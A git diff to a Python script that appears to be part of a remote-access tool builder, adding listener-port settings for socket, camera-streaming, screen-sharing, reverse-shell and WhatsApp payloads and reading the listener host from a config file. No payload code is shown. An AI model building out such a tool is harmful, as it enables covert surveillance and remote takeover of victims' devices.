@@ -1,6 +1,17 @@
 """
     this code created by 0RaMsY0
 """
+#checking var
+LHOST_OPT = False
+#main host for everything
+LHOST = ""
+#payload configuration veriables
+P_LPORT_SOCKET = ""
+P_LPORT_CameraStreaming = ""
+P_LPORT_ScreenSharing = ""
+P_LPORT_ReverseShell = ""
+P_LPORT_Whatsapp = ""
+
 import argparse
 import time, os, sys
 from typing import Text
@@ -11,6 +22,7 @@ from assets.symbols import Sminess, Splus, Swarning, Ssowrd
 from payloads.name import PAYLOADS_TYPES
 from errors.WarningHandler import * #error handler you will find the script in warnings\WarningHandler.py directory
 import json
+import socket
 CR = colors #colors class from assets/colors.py
 
 PARSER = argparse.ArgumentParser()
@@ -59,6 +71,16 @@ if __SET__:
     type have being chosing by the user
     """
     if __SET__ == PAYLOADS_TYPES[0]:
-        with open("config.json", "rb") as JSON_CONF:
-            CONFIG_LOAD = json.loads(str(JSON_CONF))
-            print(CONFIG_LOAD)
+        with open("config.json", "r") as JSON_CONF:
+            CONFIG_LOAD = json.load(JSON_CONF)
+            if __SocketLhost__ is None:
+                if CONFIG_LOAD["PayloadConfig"]["lhost"] is None:
+                    NoLhostSpec()
+                    sys.exit()
+                else:
+                    if CONFIG_LOAD["PayloadConfig"]["lhost"] is not None:
+                        if CONFIG_LOAD["PayloadConfig"]["lhost"] == "auto":
+                            LHOST = socket.gethostbyname(socket.gethostname())
+                        else:
+                            LHOST = CONFIG_LOAD["PayloadConfig"]["lhost"]
+print(LHOST)
